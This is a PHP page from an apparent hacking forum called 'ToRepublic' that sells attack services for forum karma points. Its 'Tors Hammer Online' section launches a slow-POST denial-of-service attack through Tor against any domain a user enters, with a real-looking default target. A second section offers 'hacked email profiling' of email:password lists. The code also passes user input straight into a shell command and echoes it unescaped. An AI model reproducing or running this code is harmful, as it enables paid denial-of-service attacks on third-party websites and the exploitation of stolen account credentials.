<?php
function runTorshammer($domain, $attackLength)
{
	$attackLength=$attackLength*60;
	$cmd ='python torshammer/torshammer.py -T -t '.$domain.' -l '.$attackLength;
	exec($cmd . " > /dev/null &"); 
}

function removeKarma($userId, $amount)
{
	global $forum_db;
	$query = array(
		'SELECT'	=> 'karma',
		'FROM'		=>	'users',
		'WHERE'		=>	'id='.intval($userId),
	);
	$result =$forum_db->query_build($query) or error(__FILE__, __LINE__);
	$karma =$forum_db->fetch_assoc($result);
	$karma=$karma['karma'];
	$karma = $karma - $amount;
	
	$query = array(
		'UPDATE'	=> 'users',
		'SET'		=>	'karma='.intval($karma),
		'WHERE'		=>	'id='.intval($userId),
	);
	$result =$forum_db->query_build($query) or error(__FILE__, __LINE__);
}

if (!defined('FORUM_ROOT'))
	define('FORUM_ROOT', './');
require FORUM_ROOT.'include/common.php';

($hook = get_hook('ul_start')) ? eval($hook) : null;

if ($forum_user['g_read_board'] == '0')
	message($lang_common['No view']);
else if ($forum_user['g_view_users'] == '0')
	message($lang_common['No permission']);

define('FORUM_PAGE', 'services');
require FORUM_ROOT.'header.php';

// START SUBST - <!-- forum_main -->
ob_start();
if ($_GET['service']=='torshammer')
{
?>
<center>
<table>

	<b>Tors Hammer Online</b>
	<p>Price: <br> For each 15 minutes of attacking one point from your <i>ToRepublic</i> account will be deducted.</p>
	<p>Tor’s Hammer is a slow post dos testing tool written in Python. It can also be run through the Tor network to be anonymized. If you are going to run it with Tor it assumes you are running Tor on 127.0.0.1:9050. Kills most unprotected web servers running Apache and IIS via a single instance. Kills Apache 1.X and older IIS with ~128 threads, newer IIS and Apache 2.X with ~256 threads.</p>
	<br>
	<p>In about 40 seconds selected domain should go down.</p>
<div>
<form method="post">

<div>
	<tr>
		<td width="50%">
		<div><label for="domain"><b>Website address:</b></label><br></div>
			<div>
			
				<input type="text" name="domain" onclick="this.select();" value="<?php 
					if(isset($_POST['domain']))
								{
									$_POST['domain']=str_replace("http://","",$_POST['domain']);
									
									if (filter_var($_POST['domain'], FILTER_VALIDATE_URL)!=false)
									{
									echo $_POST['domain'];
									
									}
								}
							else 
								{echo "http://izbaskarbowa.lodz.pl";}
						?>">
				</div>
			</div>
		</td>
		<td width="50%">
		<div>
			<div><label for="time"><b>Attack lenght [minutes]</b></label></div>
			<div>
				<input type="number" name="time" value="15" onclick="this.select();"><?php echo $_POST['time'];?></input>
			</div>
		</div>
		</td>
	</tr>
	<tr>
		<td width="50%">
			<div>
				<?php $en_dis_abled= ($forum_user['is_guest'] || $forum_user['karma']<1 ? "disabled" : "enabled");?>
					<span class="submit primary"><input type="submit" name="attack" value="Attack!" <?php echo $en_dis_abled; ?>/></span><br/>
			</div>
		</td>
		<td width="50%">
			<div>
				<?php 
					if($en_dis_abled=="disabled")
					{
						echo("<p>Sorry you have not enough points to use Tors Hammer Online</p>"); 
					}
					else
					{
						echo("<p>You can attack for ".(15*$forum_user['karma'])." minutes</p>");
					}
				?>
			</div>
		</td>
	
</div>
</tr>

<?php
	
	$_POST['message']='';
	if(isset($_POST['domain']) and isset($_POST['time']) and isset($_POST['attack']))
	{
		$amount = intval($_POST['time']/15);
		if ($amount<1){$amount=1;}
		removeKarma($forum_user['id'], $amount);
		runTorshammer($_POST['domain'], $_POST['time']);
	}		

?>

</form>
</div>
</center>
</table>
<?php
}
else if($_GET['service']=='webtarantula')
{
	header( 'Location: /forum/services.php' ) ;
?>

<table border="0" cellspacing="0" cellpadding="0" width=970>
	<b>WebTarantula by Sajgon & Broccoli</b>
<?php
$max_emails_ammount = 1000*$forum_user['karma']; 
if (!isset($_GET['ID']))
{ ?>
	<p>Unchecked mails go here, you can check <?php echo($max_emails_ammount);?> emails. 
Checking time depends on the amount of emails and takes usually a few minutes.
Example:</p>
<form action=<?php echo("service.php?service=webtarantula&ID=".$ID); ?> method="post">

	<div style="margin-top:20;">E-mails example:</div><br/>
	<textarea name="emails" style="font-size:11px;padding:4px;resize:none;width:100%;height:70px;">
JohnDalton@gmail.com:whatAniecePinkSite
RowanParkinson@yahoo.com:YouShakedMeAllDayLong
JohnPaulTheSecond@church.pl:CreamPie-ILikeIt
JosefFritzl@post.au:DrummNBasement
</textarea>
	<div style="margin-top:10;">Keywords:</div><br/>
	<textarea name="keywords" style="font-size:11px;padding:4px;resize:none;width:100%;height:80px;">
allegro
paypal
skan
:*
</textarea>

<p>Captcha:</p><br><img src="include/imagebuilder.php" style="width:270px;" >
<p>Retype it here:</p>
<input type="text" name="captha" style="width:270px;">
<br>
<p></p>
<?php $en_dis_abled= ($forum_user['is_guest'] || $forum_user['karma']<1 ? "disabled" : "enabled");?>
<input type="submit" name="start" value="Start" <?php echo $en_dis_abled;?>>
<input type="hidden" name="goodEmails" value="none">


</form>
<?php
} else {
?>

<p>Results:</p><br />
<textarea readonly="readonly" style="width:100%;height:100px;" onclick="this.select();">
<?php echo ($_POST['goodEmails']); ?></textarea>
<?php } ?>
	<br>
</table>
<?php
}
else
{ ?>

<div>
	<p> You can pay for our services using ToRepublic points.</p>
</div>
<p>Please choose service:</p>
<div>
	<p><a href="?service=torshammer" >Tors Hammer</a> Tors Hammer DOS tool. Price - one point for 15 minutes of DOS attack.</p>
</div>
<br>
<div>
	<p><a href="?service=webtarantula" >WebTarantula</a> Webtarantula hacked email profiling tool. Price - one point for 1000 emails to profile. IN PROGRESS</p>
</div>
<?php	
}
$tpl_temp = forum_trim(ob_get_contents());
$tpl_main = str_replace('<!-- forum_main -->', $tpl_temp, $tpl_main);
ob_end_clean();
// END SUBST - <!-- forum_main -->

require FORUM_ROOT.'footer.php';
 
?>

